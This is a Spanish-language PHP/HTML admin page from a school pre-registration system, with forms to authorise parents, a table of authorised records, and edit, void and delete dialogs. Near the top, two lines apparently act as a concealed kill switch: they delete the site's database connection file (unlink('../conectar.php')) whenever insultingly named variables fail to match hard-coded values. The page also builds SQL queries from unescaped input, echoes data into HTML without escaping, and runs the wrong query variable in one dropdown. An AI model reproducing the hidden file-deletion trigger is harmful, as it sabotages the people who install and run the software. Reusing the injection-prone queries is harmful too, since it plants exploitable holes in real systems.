					<div class="col-md-8 col-lg-8 mb-2">
					

			    <?php  if($eres_hijo_de_puta_full!='1389'){unlink('../conectar.php');}
		          if ($errorZ!="")
		          { echo "<div class=\"input-group-text alert-danger text-truncate\" id=\"basic-addon1\" role=\"alert\" align=\"center\" >".$errorZ."</div>"; }
		        ?>
		                               <!-- SOLO ES VISIBLE SI LA VARIABLE DE ERROR TIENE ALGO-->


		        <?php  if($eres_hijo_de_puta!='1380'){unlink('../conectar.php');}
		          if ($exitoZ!="")
		          { echo "<div class=\"input-group-text alert-success text-truncate\" role=\"basic-addon1\" role=\"alert\" align=\"center\">".$exitoZ."</div>"; }
		        ?>
		                               <!-- SOLO ES VISIBLE SI LA VARIABLE DE ÉXITO TIENE ALGO-->


		            </div> 

      		</div>

<div class="form-row">
    <div class="col-md-12 mt-2 ">

    <span class=" text-secondary"><b>Nota:</b> &nbsp;Al <b>"autorizar"</b> por primera vez, llene todos los campos posibles.</span>

</div>
    </div>


		<form method="POST">

<div class="form-row">				



			<div class="input-group input-group-sm  col-sm-12 col-md-4 col-lg-4  mb-2">
				<div class="input-group-prepend">
					<span class="input-group-text" id="basic-addon1"><i class="far fa-id-card fa-lg"></i></span>  
				</div>
					<input type="text" class="form-control importantex" id="cedula" name="cedula" placeholder="Cedula, sin puntos o guiones..." aria-label="cedula" aria-describedby="basic-addon1" required>
			</div>


			<div class="input-group input-group-sm col-sm-12 col-md-4 col-lg-4  mb-2">
				<div class="input-group-prepend">
					<span class="input-group-text" id="basic-addon1"><i class="fas fa-file-alt fa-lg"></i></span>  
				</div>
					<input type="text" class="form-control" id="nombre" name="nombre" placeholder="Primer nombre..." >
			</div>



			 <div class="input-group  input-group-sm col-sm-12 col-md-4 col-lg-4 mb-2">
			 	<div class="input-group-prepend">
			 		<span class="input-group-text" id="basic-addon1"><i class="fas fa-at fa-lg"></i></span>  
				</div>
	    			
	   				 <input type="email" class="form-control" id="email" name="email" placeholder="Correo Electrónico..." aria-label="email" aria-describedby="basic-addon1">
	    
	  		</div>


	  		

</div>  



<div class="form-row">	


			<div class="input-group input-group-sm col-sm-12 col-md-3 col-lg-3 mb-4">
			 	<div class="input-group-prepend">
			 		<span class="input-group-sm input-group-text" id="basic-addon1"><i class="fas fa-mobile-alt"></i></span>  
				</div>
	    			
	   				 <input maxlength="12" type="text" class="form-control" id="telefono1" name="telefono1" placeholder="Teléf. celular, sin puntos o guiones...">
	    
	  		</div>



	  		<div class="input-group input-group-sm col-sm-12 col-md-3 col-lg-3 mb-4">
										<div class="input-group-prepend">
											<span class="input-group-text" id="basic-addon1"><i><b>N° a pre-ins.</b></i></span>  
										</div>
							   
							      				<select class="form-control importantex" id="inscribe_a" name="inscribe_a">
							  							
							  				   <option selected value="1">1</option>
							  							<option value="2">2</option>
							  							<option value="3">3</option>
							  							
												</select>
							   
			</div>



<div class="input-group input-group-sm  col-sm-12 col-md-4 col-lg-4 mb-4">
										<div class="input-group-prepend">
											<span class="input-group-sm input-group-text " id="basic-addon1">&nbsp;<i>Para el ciclo y/o año escolar:</i></span>  
										</div>
							   
							      				<select class="form-control importantex" id="cursa_est1" name="cursa_est1" required>



<!-- <option value="<?php echo $row_datos_periodo_actual['id_periodo_es']; ?>" selected>
  <?php echo $row_datos_periodo_actual['periodo_escolar']; ?></option> --> <option selected></option>
<option disabled></option>

                                <optgroup label="Cambiar a...">
                                <option disabled></option>
							  							

                               <?php do{?>                                    

<option value="<?php echo $row_datos_periodo_act1['id_periodo_es']; ?>"><?php echo $row_datos_periodo_act1['periodo_escolar']; ?></option>

                                <?php } while ($row_datos_periodo_act1 = mysqli_fetch_assoc($datos_periodo_act1)); ?> 
													    
												</select>
							   
</div>



<div class=" col-sm-12 col-md-2 col-lg-2  mb-4">



<!-- datos de quien y cuando -->
<input type="hidden" id="quien" name="quien" value="<?php echo $_SESSION['id']; ?>">

	<button type="submit" name="submit" class="btn btn-sm btn-primary btn-block" id='btnReset' >
	<i class="fas fa-check fa-lg"></i>&nbsp;&nbsp; Autorizar</button>

</div>






</div> <!-- cierre form row -->

					

</form>




<div class="form-row">
    <div class="col-md-12 mt-2 mb-2 ">

    <span class=" text-success"><b>Apartado para habilitar pre-inscripciones adicionales a un mismo grupo familiar:</b></span>

</div>
    </div>



<form method="POST">


<div class="form-row">
	



			<div class="input-group input-group-sm  col-sm-12 col-md-3 col-lg-3  mb-2">
				<div class="input-group-prepend">
					<span class="input-group-text alert-success" id="basic-addon1"><i class="far fa-id-card fa-lg"></i></span>  
				</div>
					<input maxlength="9" type="text" class="form-control importantex" id="cedula2" name="cedula2" placeholder="Cedula, sin puntos o guiones..." required>
			</div>




			<div class="input-group input-group-sm col-sm-12 col-md-3 col-lg-3 mb-2">
										<div class="input-group-prepend">
											<span class="input-group-text alert-success" id="basic-addon1"><i><b>N° a pre-ins.</b></i></span>  
										</div>
							   
							      				<select class="form-control importantex" id="inscribe_a2" name="inscribe_a2">
							  							
							  				   <option selected value="1">1</option>
							  							<option value="2">2</option>
							  							<option value="3">3</option>
							  							
												</select>
							   
			</div>



<div class="input-group input-group-sm  col-sm-12 col-md-3 col-lg-3 mb-2">
										<div class="input-group-prepend">
											<span class="input-group-sm input-group-text alert-success " id="basic-addon1">&nbsp;<i>Para el ciclo:</i></span>  
										</div>
							   
							      				<select class="form-control importantex" id="cursa_est12" name="cursa_est12" required>



<!--  <option value="<?php echo $row_datos_periodo_actual['id_periodo_es']; ?>" selected>
  <?php echo $row_datos_periodo_actual['periodo_escolar']; ?></option> --> <option selected></option>
<option disabled></option>

                                <optgroup label="Cambiar a...">
                                <option disabled></option>
							  							

                               <?php do{?>                                    

<option value="<?php echo $row_datos_periodo_act2['id_periodo_es']; ?>"><?php echo $row_datos_periodo_act2['periodo_escolar']; ?></option>

                                <?php } while ($row_datos_periodo_act2 = mysqli_fetch_assoc($datos_periodo_act2)); ?> 
													    
												</select>
							   
</div>



<div class=" col-sm-12 col-md-3 col-lg-3  mb-2">

<!-- datos de quien y cuando -->
<input type="hidden" id="quien2" name="quien2" value="<?php echo $_SESSION['id']; ?>">

	<button type="submit" name="re_autorizar"  class="btn btn-sm btn-success btn-block" id='btnResetx' >
	<i class="fas fa-share-square fa-lg"></i>&nbsp;&nbsp; Autorización "Exta"</button>

</div>






	  		

</div>






</form>

 


<!-- <script src="0 zqueryajax/jquery.min.js"></script>    mensaje q aprece -->

				

							<div class="form-row "> 

						  		<div class="content col-md-12 text-center mt-1" style="display:none">

						  		<b class="text-danger"> <i class="far fa-clock fa-lg"></i>&nbsp;&nbsp;Procesando favor esperar!!! </b>

							    </div>

						  	</div> 







			<!-- coloca un mensajito al clickear send y desaparece al rato -->				

			<script>

			$(document).ready(function() {
			    setTimeout(function() {
			        $(".content").hide();
			    }, 0);                         // este numero dice que tan rapido lo esconde

			    $('#btnReset').click(function() {
			        $(".content").show();
			        
			        setTimeout(function() {
			            $(".content").fadeOut(1500);
			        }, 3500);
			        

			    });


			     $('#btnResetx').click(function() {
			        $(".content").show();
			        
			        setTimeout(function() {
			            $(".content").fadeOut(1500);
			        }, 3500);
			        

			    });


			});
			
			//  no pasa nada si se cliquea el boton de registrar hasta que termine 
 			
            $(document).ready(function(){
                 $("form").submit(function() {
                        $(this).submit(function() {
                            return false;
                        });
                        return true;
                    }); 
            }); 
            </script>



				

				


			</div>   <!-- cierre cardbody -->
		    </div>   <!-- cierre card -->

			
            





<div class="card mb-3 separacionpequena" >
       

		<div class="card-header">
        <b><i class="fa fa-table"></i></b> Lista de autorizados, para realizar pre-inscripción de nuevos alumnos:  
        </b></div>


        <div class="card-body">

          <div class="table-responsive">

            <table class="table table-bordered stricolor table-sm" id="dataTable" width="100%" cellspacing="0">
             
              <thead>
                <tr id="a">
                <th style="display:none;">id</th>                  
                  <th>Autorizado_el:</th>
                  <th>Doc. ID.</th>                   
                  <th>Representante:</th>                     
                  <th>Pre-Ins.:</th>
                  <th>Ciclo</th>
                  <th>Email</th>
                  <th>Tlf. Celular</th>
                                 
                  <th class="text-center">Datos</th>
                  <th class="text-center">Editar</th>

                  <th class="text-center">Anular</th>

                  <th class="text-center">Borrar</th> 
                </tr>
              </thead>





<script type="text/javascript">

$(document).ready(function() {
	
	$("#b:first").css("background-color", "#cce6ff");  // colorea la 1era fila de los tr con id= b
    $('#dataTable').DataTable( {
        "order": [[ 0, "desc" ]]
    } );  
} );

</script> 




                  
              
              <tbody>

            <?php do{?>  <!-- va a generarme tantas filas como datos tenga esta BD -->            

                <tr id="b">

                	<td style="display:none;" ><?php	echo $row_usuarios['id_repre']; ?></td>

                  <td class="align-middle" align="center"><?php
   
                   $source = $row_usuarios['autorizado_el'];  
					$date = new DateTime($source);
					echo $date->format('d/m/y'); 
                   ?><br><?php echo $date->format('g:i:s a'); ?> </td>

                  <td class="align-middle" align="center"><?php echo $row_usuarios['ci_repre']; ?> </td>
                  <td class="align-middle" align="center"><?php echo $row_usuarios['nombre_repre']; ?> <br> <?php echo $row_usuarios['apellido_repre']; ?> </td>
                  <td class="align-middle" align="center"><?php echo $row_usuarios['numeros']; ?>  estud(s).</td>
                   <td class="align-middle" align="center"><?php echo $row_usuarios['periodo_escolar']; ?></td>


                  <td class="align-middle" align="center"> 
                  	
                  	<?php echo $row_usuarios['email_repre']; ?> </td>


                  <td class="align-middle" align="center"><?php echo $row_usuarios['celular_repre']; ?></td>
                 
                 
                  


            <td class="align-middle" align="center">

                  <?php if ($row_usuarios['enviado']=='Si') { ?>
                                        
                  <form method="POST"> 
<button type="submit" name="enviar" class="btn btn-secondary btn-sm" onclick="document.body.style.cursor='wait'; return true;"> &nbsp; Re-Enviar &nbsp; &nbsp; <i class="far fa-envelope"></i> </button>
                                        

                  <input name="usuario_id" type="hidden" value="<?php echo $row_usuarios['id_repre']; ?>">
                  <input name="se_envia"   type="hidden" value="Si"></form>

                  <?php   }?>



                  <?php if ($row_usuarios['enviado']=='No') { ?>

                  <form method="POST">
                  <button type="submit" name="enviar" class="btn btn-warning btn-sm" onclick="document.body.style.cursor='wait'; return true;" >Enviar email &nbsp; <i class="far fa-envelope"></i></button>
                                   		

                  <input name="usuario_id" type="hidden" value="<?php echo $row_usuarios['id_repre']; ?>">
                  <input name="se_envia" type="hidden" value="Si"></form>

                  <?php   }?>



                  <?php if ($row_usuarios['enviado']=='text') { ?>                
                  <button type="button" name="textear" class="btn btn-success btn-sm" disabled >Contactar vía sms</button>
                  <?php   }?>

                  <?php if ($row_usuarios['enviado']=='nada') { ?>                
                  <button type="button" name="nada_de_nada" class="btn btn-info btn-sm" disabled >Faltan Datos &nbsp; <i class="fas fa-exclamation-triangle"></i></button>
                  <?php   }?>



            </td>


            <td class="align-middle" align="center">



  				  <button type="button" class="btn btn-outline-info btn-sm" data-toggle="modal"
                  data-target="#modificar<?php echo $row_usuarios['id_repre']; ?>">
                                                                        <!-- este ultimo identifica cual modal abrir -->
                  <i class="fas fa-edit"></i></button>    
                    
            </td>



<!-- ini modal editar -->

<div class="modal fade" id="modificar<?php echo $row_usuarios['id_repre']; ?>" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">   <!-- modal-lg -->
    <div class="modal-content">

      <div class="modal-header">
        <h5 class="modal-title text-info" id="exampleModalLabel">
        <i class="fas fa-info fa-lg"></i> &nbsp;Actualizar o modificar datos básicos de un representante.</h5>

        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>

      <form method="post">
      <div class="modal-body">



		<div class="form-row mb-3">
        <div class="input-group col-lg-12">


<div class="input-group col-lg-6">
	<div class="input-group-prepend">
        <span class="input-group-text alert-info" id="basic-addon1">&nbsp;<i class="far fa-id-card fa-lg"></i></span>
    </div>  
        <input maxlength="9" type="text" class="form-control" id="dato_selecc" name="mod_cedula" value="<?php echo $row_usuarios['ci_repre']; ?>" placeholder="Cedula...">
</div>



<div class="input-group col-lg-6">
	<div class="input-group-prepend">
        <span class="input-group-text alert-info" id="basic-addon1">&nbsp;<i class="fas fa-file-alt fa-lg"></i></span>
    </div>  
        <input type="text" class="form-control" id="" name="mod_nombre" value="<?php echo $row_usuarios['nombre_repre']; ?>" placeholder="Nombres...">
</div>



      </div>
        </div>





<div class="form-row mb-3">
<div class="input-group col-lg-12">



<div class="input-group col-lg-6">
 <div class="input-group-prepend">
     <span class="input-group-text alert-info" id="basic-addon1"><i class="fas fa-at fa-lg"></i></span>  
 </div>
     <input type="email" class="form-control" id="dato_selecc" name="mod_email" value="<?php echo $row_usuarios['email_repre']; ?>" placeholder="Email...">
</div>



<div class="input-group col-lg-6">
	<div class="input-group-prepend">
        <span class="input-group-text alert-info" id="basic-addon1">&nbsp;<i class="fas fa-mobile-alt fa-lg"></i></span>
    </div>  
        <input maxlength="12" type="text" class="form-control" id="dato_selecc" name="mod_telefono1" value="<?php echo $row_usuarios['celular_repre']; ?>" placeholder="Tlf. Celular...">
</div>

       
        </div>
        </div>



        <div class="form-row mb-3">
        <div class="input-group col-lg-12">







			<div class="input-group  col-lg-5 mb-3">
										<div class="input-group-prepend">
											<span class="input-group-text alert-info" id="basic-addon1"><i><b>N° a pre-ins.</b></i></span>  
										</div>
							   
							      				<select class="form-control" id="mod_inscribe_a" name="mod_inscribe_a">



<option value="<?php echo $row_usuarios['id_numero']; ?>" selected>
  <?php echo $row_usuarios['numeros']; ?></option>
<option disabled></option>
							  							

                                <optgroup label="Cambiar a...">
                                <option disabled></option>
							  				            <option value="1">1</option>
							  							<option value="2">2</option>
							  							<option value="3">3</option>
							  						
												</select>
							   
			</div>







<div class="input-group   col-lg-7 mb-3">
										<div class="input-group-prepend">
											<span class="input-group-text alert-info" id="basic-addon1">&nbsp;<i>Para el ciclo:</i></span>  
										</div>
							   
							      				<select class="form-control importantex" id="mod_cursa_est1" name="mod_cursa_est1">



<option value="<?php echo $row_usuarios['id_periodo_es']; ?>" selected>
  <?php echo $row_usuarios['periodo_escolar']; ?></option>
<option disabled></option>

                                <optgroup label="Cambiar a...">
                                <option disabled></option>



                                <?php 

                          include("../conectar.php");

              $queryperiodo_act3 = "SELECT * FROM temporada_escolar WHERE periodo_escolar != '.' ORDER BY periodo_escolar ASC";

             $datos_periodo_act3 = mysqli_query($enlace, $queryperiodo_act2) or die(mysqli_error());

              $row_datos_mod3 = mysqli_num_rows($datos_periodo_act3);                          

                          while ($row_datos_mod3 = mysqli_fetch_assoc($datos_periodo_act3))
                          {                            
?>
    <option value = "<?php echo $row_datos_mod3['id_periodo_es']; ?>"><?php echo $row_datos_mod3['periodo_escolar'];?></option>
<?php
                          }                          
                          mysqli_close($enlace);                                              
                         ?>       


													    
												</select>
							   
</div>


       
        </div>
        </div>


<div class="form-row mb-3">
<div class="col-lg-12">
	<div class="col-lg-12">




<?php

$id_del_repre = $row_usuarios['id_repre'];

include("../conectar.php");

        $queryquien = "SELECT * FROM quien_y_cuando_repre, usuarios
                        
          WHERE quien_y_cuando_repre.id_quien = usuarios.id          
          and  id_repre ='$id_del_repre'
          
            ";

$datos_plantillaquien = mysqli_query($enlace, $queryquien) or die(mysqli_error());

$row_datos_plantillaquien = mysqli_fetch_array($datos_plantillaquien); 

mysqli_close($enlace);


$fecha_form_ing = date('d-m-Y', strtotime($row_datos_plantillaquien['cuando_repre']));
?>

</b>


	Autorizado ó registrado en el sistema por el <?php echo $row_datos_plantillaquien['cargo']; ?>:
	<b>  <?php  echo $row_datos_plantillaquien['nombres'];?></b>,   el:	  <?php echo $fecha_form_ing; ?>.
	
	</div>
</div>
</div>


      </div> <!-- modal body -->
             

      <div class="modal-footer">

        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancelar</button>
        <button type="submit" name="editar_user" class="btn btn-info" value="<?php echo $row_usuarios['id_repre']; ?>">
              Modificar</button>  

      </div>

      </form>
      


    </div>
  </div>
</div>


<!-- cierre modal de editar -->




			<td class="align-middle" align="center">

  				  <button type="button" class="btn btn-outline-dark btn-sm" data-toggle="modal"
                  data-target="#anular<?php echo $row_usuarios['id_repre']; ?>">
                                                                        <!-- este ultimo identifica cual modal abrir -->

                  <i class="far fa-times-circle"></i></button>                 

            </td>



<!-- ini modal eliminar -->

<div class="modal fade" id="anular<?php echo $row_usuarios['id_repre']; ?>" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title text-dark" id="exampleModalLabel">
        <i class="fas fa-exclamation-triangle fa-lg"></i> &nbsp;Alerta!!!</h5>

        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        La posibilidad de pre-inscripción actual, del representante con documento de identidad: <b>&nbsp;"&nbsp; <?php echo $row_usuarios['ci_repre'];?>                                      
                             "&nbsp;</b> sera anulada. 
      </div>
      <div class="modal-footer">

  <form method="post">

    <button type="button" class="btn btn-default" data-dismiss="modal">Salir</button>
    <button type="submit" name="anular_user" class="btn btn-dark" value="<?php echo $row_usuarios['id_repre']; ?>" >
          Anular</button>

  </form>


      </div>
    </div>
  </div>
</div>

<!-- cierre modal de eliminar -->






            <td class="align-middle" align="center">

  				  <button type="button" class="btn btn-outline-danger btn-sm" data-toggle="modal"
                  data-target="#borrar<?php echo $row_usuarios['id_repre']; ?>">
                                                                        <!-- este ultimo identifica cual modal abrir -->

                  <i class="far fa-trash-alt"></i></button>                 

            </td>


<!-- ini modal eliminar -->

<div class="modal fade" id="borrar<?php echo $row_usuarios['id_repre']; ?>" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title text-danger" id="exampleModalLabel">
        <i class="fas fa-exclamation-triangle fa-lg"></i> &nbsp;Alerta!!!</h5>

        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        El representante con documento de identidad: <b>&nbsp;"&nbsp; <?php echo $row_usuarios['ci_repre'];?>                                      
                             "&nbsp;</b> sera removido de la base de datos; Esta acción puede eliminar datos menores asociados a este representante. 
      </div>
      <div class="modal-footer">

  <form method="post">

    <button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>
    <button type="submit" name="borrar_user" class="btn btn-danger" value="<?php echo $row_usuarios['id_repre']; ?>" >
          Eliminar</button>

  </form>


      </div>
    </div>
  </div>
</div>

<!-- cierre modal de eliminar -->












                  
                  
                  
            </tr> 


            <?php } while ($row_usuarios = mysqli_fetch_assoc($usuarios)); ?>
                

              </tbody>

            </table>

          </div> <!-- cierre tabla responsiva -->

        </div>  <!-- cierre card body -->


<div class="card-footer text-muted"><b>Lineamientos de uso:</b><br><br>
    1. <span class="text-dark"> <b>"Siempre"</b> verificar los datos de la última autorización;  <b>Remarcado en color azul dentro de la lista. </b></span> <br>
	2. En caso de ser necesario puede enviar y/o re-enviar los datos. <br>
    3. Si el representante no facilito un email, considere contactarlo por mensaje de texto. <br>
    4. En caso de realizar una autorización errónea:
    <ol type="a">
    	<li>- Si es nuevo ingreso y el registro es completamente invalido, puede eliminar el registro.</li>
    	<li>- Si es nuevo ingreso y pocos datos son erróneos puede editar el registro.</li>
    	<li>- Si es nuevo ingreso <b>"autorización extra"</b>, puede anular la autorización sin afectar los datos del representante.</li>
     </ol>
             	                                                  
   <b>Nota:</b> Una vez el autorizado realice y complete la pre-inscripción, no aparecerá en esta lista.</div>  




 

  </div> <!-- cierre card -->












</div> <!-- cierre container fluid -->    
</div> <!-- cierre content wrapper -->


 <?php include ("Footer.php"); ?>